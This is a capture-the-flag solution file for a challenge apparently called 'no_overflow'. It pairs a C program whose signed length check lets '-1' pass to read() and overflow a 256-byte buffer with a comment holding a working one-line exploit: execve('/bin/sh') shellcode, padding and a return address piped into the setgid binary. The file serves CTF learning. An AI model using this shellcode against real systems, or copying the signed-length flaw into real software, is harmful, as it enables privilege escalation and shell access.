/*
*/ Solution
** pico4180@shell:/home/no_overflow$ (echo "-1"; perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x45\x45\x45\x45" . "A"x219 . "AAAA" . "\x06\xd6\xff\xff" . "\x00"'; cat)|./no_overflow  
*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define BUFSIZE 256

void greet(int length){
    char buf[BUFSIZE];
    puts("What is your name?");
    read(0, buf, length);
    printf("Hello, %s\n!", buf);
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    int length;
    be_nice_to_people();

    puts("How long is your name?");
    scanf("%d", &length);

    if(length < BUFSIZE) //don't allow buffer overflow
        greet(length);
    else
        puts("Length was too long!");
}
